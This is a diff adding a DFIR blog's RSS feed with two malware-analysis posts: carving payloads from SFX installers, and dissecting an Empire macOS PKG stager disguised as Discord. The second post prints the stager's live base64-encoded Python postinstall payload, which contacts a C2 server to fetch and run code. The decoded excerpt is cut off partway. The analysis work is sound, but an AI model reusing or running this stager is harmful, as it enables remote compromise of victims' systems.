@@ -1,0 +1,980 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title></title>
+    <description>ForensicITGuy&apos;s blog about DFIR and tech</description>
+    <link>https://forensicitguy.github.io/feed.xml/</link>
+    <atom:link href="https://forensicitguy.github.io/feed.xml/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Sun, 11 Jul 2021 20:52:40 -0500</pubDate>
+    <lastBuildDate>Sun, 11 Jul 2021 20:52:40 -0500</lastBuildDate>
+    <generator>Jekyll v4.2.0</generator>
+    
+      <item>
+        <title>Extracting Malicious Payloads from SFX Self-Extracting Installers</title>
+        <description>&lt;p&gt;Self-extracting installers are an awesome way to distribute software because they require very little overhead and minimal configuration. Because of this, some malware threats use these SFX files to deploy components to victim systems, and malware analysts need to know how to safely unpack the components for investigation. For this example, we’re going to walk through the process to unpack this malicious installer: &lt;a href=&quot;https://www.virustotal.com/gui/file/9d27976b21da5fc419da598ea44456a528b9fbf83f24fc5e14f697f610a5b295/detection&quot;&gt;https://www.virustotal.com/gui/file/9d27976b21da5fc419da598ea44456a528b9fbf83f24fc5e14f697f610a5b295/detection&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-7zip-sfx-executable-format&quot;&gt;The 7zip SFX Executable Format&lt;/h2&gt;
+
+&lt;p&gt;7zip self-extracting installers are indeed Windows Portable Executable files, but they are a specialized format to themselves. To create a SFX file, you need two or three components:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;7zip SFX Module (from the LZMA SDK)&lt;/li&gt;
+  &lt;li&gt;Installer Configuration Script (optional)&lt;/li&gt;
+  &lt;li&gt;7zip archive containing content&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The SFX module is a minimal Windows PE file designed to execute the contents of the configuration script and extract the archive included in the created SFX file. The configuration script contains plaintext commands in configuration stanzas, and this helps creators kick off specialized installations. Finally, the archive containing content is the actual payload we want to retrieve.&lt;/p&gt;
+
+&lt;p&gt;These components fit together rather easily when a creator executes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy /b 7z-module.sfx + config.txt + archive.7z installer.exe&lt;/code&gt;. The SFX format assumes that all of these components are physically joined together, appended to the same file.&lt;/p&gt;
+
+&lt;p&gt;This means we can unpack the SFX by looking for the magic header bytes for a 7z archive to retrieve the malicious payloads inside.&lt;/p&gt;
+
+&lt;h2 id=&quot;unpacking-the-malicious-content&quot;&gt;Unpacking the Malicious Content&lt;/h2&gt;
+
+&lt;p&gt;To unpack the content of a SFX file, we can open the file in a hex editor and look for the magic bytes of a 7z archive: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;37 7A BC AF 27 1C&lt;/code&gt;. Once we find those magic bytes, we can select all the bytes of the file from that header to the end of the file. After selection, we can copy those bytes and paste them into a new file to obtain the malicious payload.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/extracting-sfx-installer/searching-magic-bytes.png&quot; alt=&quot;Searching for 7z Magic Bytes&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once we’ve created the new payload file from the copied bytes, we can open the file from any archive tool that supports 7z.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/extracting-sfx-installer/opening-extracted-payload.png&quot; alt=&quot;Opening extracted payload&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;what-about-password-protected-sfxs&quot;&gt;What About Password Protected SFXs?&lt;/h2&gt;
+
+&lt;p&gt;The same method still works. The only difference is that our ending payload.7z archive will be password protected. If you have the password, it’s trivial to extract from there. If you don’t, get to cracking.&lt;/p&gt;
+
+&lt;h2 id=&quot;bonus-the-configuration-script&quot;&gt;Bonus: The Configuration Script&lt;/h2&gt;
+
+&lt;p&gt;Since the components of the SFX are physically appended together, this also means that the configuration script can be found as plaintext inside the bytes of the SFX file. To find it, search through instances of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!@&lt;/code&gt; until you find text that looks similar to this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-txt&quot;&gt;!@Something@!UTF-8!
+...
+!@SomethingEnd@!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/extracting-sfx-installer/configuration-script.png&quot; alt=&quot;SFX Configuration Script&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sat, 10 Jul 2021 00:00:00 -0500</pubDate>
+        <link>https://forensicitguy.github.io/feed.xml/windows/7zip/sfx/self-extracting/installers/2021/07/10/extracting-sfx-installer.html</link>
+        <guid isPermaLink="true">https://forensicitguy.github.io/feed.xml/windows/7zip/sfx/self-extracting/installers/2021/07/10/extracting-sfx-installer.html</guid>
+        
+        
+        <category>windows</category>
+        
+        <category>7zip</category>
+        
+        <category>sfx</category>
+        
+        <category>self-extracting</category>
+        
+        <category>installers</category>
+        
+      </item>
+    
+      <item>
+        <title>Analyzing an Empire macOS PKG Stager</title>
+        <description>&lt;p&gt;Command and control (C2) frameworks often support multiple platforms, and PowerShell Empire is no different. In older days, there was a Python Empyre version that eventually merged into the full Empire project and support for macOS and Linux systems still exists within Empire. For these platforms, Empire leverages python-based launchers to execute commands. While the Python launchers may be platform independent, adversaries must still deliver them to victim hosts. This delivery presents an excellent opportunity for detection and analysis. For this example, we’re going to walk through the analysis of an Empire stager found in VirusTotal: &lt;a href=&quot;https://www.virustotal.com/gui/file/19e19adc03b313236462b30a1a438a604d4c0b4c86268b951689696144a63fdc/detection&quot;&gt;https://www.virustotal.com/gui/file/19e19adc03b313236462b30a1a438a604d4c0b4c86268b951689696144a63fdc/detection&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;inspecting-the-pkg-file&quot;&gt;Inspecting The PKG File&lt;/h2&gt;
+
+&lt;p&gt;For this analysis, we’ll work from a REMnux v7 host. To start off, let’s make sure we have a working folder for files.&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; ~/cases/empire-stager/stager
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; ~/Downloads/discord.pkg empire-stager/
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;empire-stager/
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lah&lt;/span&gt;
+
+total 48K
+drwxrwxr-x 3 remnux remnux 4.0K Feb  8 23:38 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxrwxr-x 9 remnux remnux 4.0K Feb  8 23:37 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 remnux remnux  35K Feb  7 01:30 discord.pkg
+drwxrwxr-x 2 remnux remnux 4.0K Feb  8 23:37 stager
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The PKG file masquerades as a component related to the Discord application, possibly the installer. To proceed we can go ahead and get an idea of the file type using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file discord.pkg
+
+discord.pkg: xar archive compressed TOC: 2674, SHA-1 checksum
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The output indicates the PKG file is a XAR archive, exactly what we expect for a PKG file.&lt;/p&gt;
+
+&lt;p&gt;Moving forward, we can unpack the PKG using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bsdtar&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bsdtar xvf discord.pkg &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; stager/
+
+x Resources
+x Resources/ru-RU.lproj
+x Distribution
+x update.pkg
+x update.pkg/PackageInfo
+x update.pkg/Bom
+x update.pkg/Payload
+x update.pkg/Scripts
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;stager/
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lah&lt;/span&gt;
+
+total 20K
+drwxrwxr-x 4 remnux remnux 4.0K Feb  8 23:44 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxrwxr-x 3 remnux remnux 4.0K Feb  8 23:38 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 remnux remnux 1.8K Nov 27  2019 Distribution
+drwxr-xr-x 3 remnux remnux 4.0K Nov 27  2019 Resources
+drwxr-xr-x 2 remnux remnux 4.0K Nov 27  2019 update.pkg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Within the Resources folder there is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ru-RU.lproj&lt;/code&gt; file. From the naming convention we can hypothesize it has something to do with language resources, but we can’t be sure because the folder is empty upon inspection.&lt;/p&gt;
+
+&lt;p&gt;Next, we can inspect the contents of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;update.pkg&lt;/code&gt; folder. As seen in the output of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bsdtar&lt;/code&gt;, it contains just a few files:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lah&lt;/span&gt;
+
+total 84K
+drwxr-xr-x 2 remnux remnux 4.0K Nov 27  2019 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxrwxr-x 4 remnux remnux 4.0K Feb  8 23:44 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 remnux remnux  35K Nov 27  2019 Bom
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 remnux remnux  777 Nov 27  2019 PackageInfo
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 remnux remnux  29K Nov 27  2019 Payload
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 remnux remnux  917 Nov 27  2019 Scripts
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+
+Bom:         Mac OS X bill of materials &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BOM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; file
+PackageInfo: ASCII text
+Payload:     &lt;span class=&quot;nb&quot;&gt;gzip &lt;/span&gt;compressed data, from Unix, original size modulo 2^32 77824
+Scripts:     &lt;span class=&quot;nb&quot;&gt;gzip &lt;/span&gt;compressed data, from Unix, original size modulo 2^32 1536
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From the directory structure and file types, it seems the contents match what we would expect from a macOS PKG file. There is a Bill of Materials (BOM) file, PackageInfo in text/XML format, and two gzipped CPIO archives: Payload and Scripts. Before unpacking the Payload and Scripts, we can inspect the PackageInfo file with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;less&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;less PackageInfo
+
+&amp;lt;pkg-info format-version&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;identifier&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;com.apple.Discord&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt; install-location&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;auth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;root&quot;&lt;/span&gt; overwrite-permissions&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;true&quot;&lt;/span&gt; generator-version&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;InstallCmds-554 (15G31)&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+    &amp;lt;payload &lt;span class=&quot;nv&quot;&gt;numberOfFiles&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;15&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;installKBytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;105&quot;&lt;/span&gt;/&amp;gt;
+    &amp;lt;scripts&amp;gt;
+        &amp;lt;postinstall &lt;span class=&quot;nv&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./postinstall&quot;&lt;/span&gt;/&amp;gt;
+    &amp;lt;/scripts&amp;gt;
+    &amp;lt;bundle &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;com.apple.Discord&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CFBundleIdentifier&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;com.apple.Discord&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./Discord.app&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CFBundleShortVersionString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CFBundleVersion&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1&quot;&lt;/span&gt;/&amp;gt;
+    &amp;lt;bundle-version&amp;gt;
+        &amp;lt;bundle &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;com.apple.Discord&quot;&lt;/span&gt;/&amp;gt;
+    &amp;lt;/bundle-version&amp;gt;
+    &amp;lt;upgrade-bundle&amp;gt;
+        &amp;lt;bundle &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;com.apple.Discord&quot;&lt;/span&gt;/&amp;gt;
+    &amp;lt;/upgrade-bundle&amp;gt;
+    &amp;lt;update-bundle/&amp;gt;
+    &amp;lt;atomic-update-bundle/&amp;gt;
+    &amp;lt;strict-identifier&amp;gt;
+        &amp;lt;bundle &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;com.apple.Discord&quot;&lt;/span&gt;/&amp;gt;
+    &amp;lt;/strict-identifier&amp;gt;
+&amp;lt;/pkg-info&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There are a few things to note from this file. First, the PackageInfo file doubles down on the masquerade that the PKG file is related to Discord. Next, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;installKBytes&lt;/code&gt; field contains a value &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;105&lt;/code&gt;. This gives us reasonable evidence to assume the Payloads archive will contain some form of content. In payload-free package files, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;installKBytes&lt;/code&gt; field will contain the value &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;, indicating all the work is done by preinstall and postinstall scripts.&lt;/p&gt;
+
+&lt;p&gt;Finally, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scripts&lt;/code&gt; section of the PackageInfo file indicates we can expect Scripts to unpack a postintall script for execution. This postinstall script should execute after the macOS Installer utility processes the content of the PKG file and after the “installation” is complete. In legitimate use cases, applications would take this opportunity to use postinstall scripts to clean up unneeded files. In this case, the postinstall script executes malware.&lt;/p&gt;
+
+&lt;h2 id=&quot;unpacking-the-malicious-content&quot;&gt;Unpacking the Malicious Content&lt;/h2&gt;
+
+&lt;p&gt;Now we can unpack the Payload and Scripts archives.&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Payload | &lt;span class=&quot;nb&quot;&gt;gunzip&lt;/span&gt; | cpio &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
+152 blocks
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Scripts | &lt;span class=&quot;nb&quot;&gt;gunzip&lt;/span&gt; | cpio &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
+3 blocks
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lah&lt;/span&gt;
+total 92K
+drwxr-xr-x 3 remnux remnux 4.0K Feb  9 00:01 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxrwxr-x 4 remnux remnux 4.0K Feb  8 23:44 ..
+drwxr-xr-x 3 remnux remnux 4.0K Feb  9 00:01 Applications
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 remnux remnux  35K Nov 27  2019 Bom
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 remnux remnux  777 Nov 27  2019 PackageInfo
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 remnux remnux  29K Nov 27  2019 Payload
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 remnux remnux 1.1K Feb  9 00:01 postinstall
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 remnux remnux  917 Nov 27  2019 Scripts
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file postinstall 
+postinstall: Bourne-Again shell script, ASCII text executable, with very long lines
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now the postinstall script is unpacked, we can recognize its file type as a Bash script. This is important to note as a postinstall script can be written in any scripting language for which the system contains an interpreter. In some packages, I’ve also seen postinstall to be a Mach-O binary instead of a script. To see the contents of postinstall, we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;less&lt;/code&gt; command again.&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;less postinstall
+
+&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import sys,base64,warnings;warnings.filterwarnings(&apos;ignore&apos;);exec(base64.b64decode(&apos;aW1wb3J0IHN5cztpbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xNzYuMTI2LjcwLjEzMjoxMDAwMSc7dD0nL2xvZ2luL3Byb2Nlc3MucGhwJztyZXE9dXJsbGliMi5SZXF1ZXN0KHNlcnZlcit0KTsKcmVxLmFkZF9oZWFkZXIoJ1VzZXItQWdlbnQnLFVBKTsKcmVxLmFkZF9oZWFkZXIoJ0Nvb2tpZScsInNlc3Npb249cUc5WlFZWFdlMEk1cG15dFpFMU4wdkFxbTljPSIpOwpwcm94eSA9IHVybGxpYjIuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIyLmJ1aWxkX29wZW5lcihwcm94eSk7CnVybGxpYjIuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliMi51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj1hWzA6NF07ZGF0YT1hWzQ6XTtrZXk9SVYrJzBlZjk2NzMyNzg5NzE4NTI1ZTc2MzgyOTM3MGJkNDg4JztTLGosb3V0PXJhbmdlKDI1NiksMCxbXQpmb3IgaSBpbiByYW5nZSgyNTYpOgogICAgaj0oaitTW2ldK29yZChrZXlbaSVsZW4oa2V5KV0pKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KaT1qPTAKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2CiAgICBqPShqK1NbaV0pJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQogICAgb3V0LmFwcGVuZChjaHIob3JkKGNoYXIpXlNbKFNbaV0rU1tqXSklMjU2XSkpCmV4ZWMoJycuam9pbihvdXQpKQ==&apos;));&quot;&lt;/span&gt; | /usr/bin/python &amp;amp;
+
+&lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The postinstall script contains base64-encoded Python commands. We know they’re base64-encoded because they’ll be decoded at runtime using the functions &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64.b64decode&lt;/code&gt; and executed with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec&lt;/code&gt;. In addition, the stager uses an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo&lt;/code&gt; command to pass the code into a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt; process. This is an evasion method, ensuring that process monitoring software such as EDR won’t notice Python having suspicious command line parameters. Since the code is in base64, we can easily decode it with the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64 -d&lt;/code&gt; and write it to a plaintext file.&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;aW1wb3J0IHN5cztpbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xNzYuMTI2LjcwLjEzMjoxMDAwMSc7dD0nL2xvZ2luL3Byb2Nlc3MucGhwJztyZXE9dXJsbGliMi5SZXF1ZXN0KHNlcnZlcit0KTsKcmVxLmFkZF9oZWFkZXIoJ1VzZXItQWdlbnQnLFVBKTsKcmVxLmFkZF9oZWFkZXIoJ0Nvb2tpZScsInNlc3Npb249cUc5WlFZWFdlMEk1cG15dFpFMU4wdkFxbTljPSIpOwpwcm94eSA9IHVybGxpYjIuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIyLmJ1aWxkX29wZW5lcihwcm94eSk7CnVybGxpYjIuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliMi51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj1hWzA6NF07ZGF0YT1hWzQ6XTtrZXk9SVYrJzBlZjk2NzMyNzg5NzE4NTI1ZTc2MzgyOTM3MGJkNDg4JztTLGosb3V0PXJhbmdlKDI1NiksMCxbXQpmb3IgaSBpbiByYW5nZSgyNTYpOgogICAgaj0oaitTW2ldK29yZChrZXlbaSVsZW4oa2V5KV0pKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KaT1qPTAKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2CiAgICBqPShqK1NbaV0pJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQogICAgb3V0LmFwcGVuZChjaHIob3JkKGNoYXIpXlNbKFNbaV0rU1tqXSklMjU2XSkpCmV4ZWMoJycuam9pbihvdXQpKQ==&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; python-stager.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;analyzing-the-python-code&quot;&gt;Analyzing The Python Code&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;less python-stager.txt
+
+import sys&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;import urllib2&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;UA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hxxp://176.126.70[.]xxx:10001&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/login/process.php&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;urllib2.Request&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server+t&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+req.add_header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;User-Agent&apos;&lt;/span&gt;,UA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+req.add_header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Cookie&apos;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;session=qG9ZQYXWe0I5pmytZE1N0vAqm9c=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
